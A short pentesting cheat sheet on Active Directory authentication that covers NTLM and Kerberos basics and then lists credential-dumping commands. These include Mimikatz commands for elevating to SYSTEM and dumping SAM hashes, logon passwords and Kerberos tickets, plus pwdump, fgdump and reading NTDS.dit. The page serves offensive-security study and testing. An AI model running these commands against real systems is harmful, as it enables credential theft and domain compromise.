# Active Directory Authentication

## NTLM Authentication

We must use the IP (not the FQDN) (remotely) to perform an NTLM authentication.

## Kerberos Authentication

We must use the FQDN (not the IP) (remotely) to perform a kerberos authentication.

## Dumping

### Dumping NTLM Hashes and Plaintext Credentials

NTLM authentication uses a challenge-response model, where a nonce/challenge encrypted using the user's NTLM hash is validated by the Domain Controller.

Dumping LM/NTLM hashes with Mimikatz

* [Full Mimikatz Guide](https://adsecurity.org/?page\_id=1821#SEKURLSALogonPasswords)
* Requires local admin rights.

```powershell
# escalate security token to SYSTEM integrity
mimikatz > privilege::debug
mimikatz > token::elevate

# dump NTLM hashes + plaintext creds
mimikatz > lsadump::sam              # dump contents of SAM db in current host
mimikatz > sekurlsa::logonpasswords  # dump creds of logged-on users
```

Other tools:

```powershell
cmd> pwdump.exe localhost
cmd> fgdump.exe localhost          # improved pwdump, shutdown firewalls 
cmd> type C:\Windows\NTDS\NTDS.dit # all domain hashes in NTDS.dit file on the Domain Controller
```

### Dumping Kerberos Tickets

Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket (TGT) is issued by the Domain Controller (with the role of Key Distribution Center (KDC)) and is used to request tickets from the Ticket Granting Service (TGS) to access services.

* Hashes are stored in the Local Security Authority Subsystem Service (LSASS).
* LSASS process runs as SYSTEM, therefore we need SYSTEM / local admin to dump hashes stored on target.

Dumping Kerberos TGT/TGS tickets with Mimikatz:

```
mimikatz > sekurlsa::tickets
```

See the page "Service Account Attacks" on how to abuse dumped tickets.
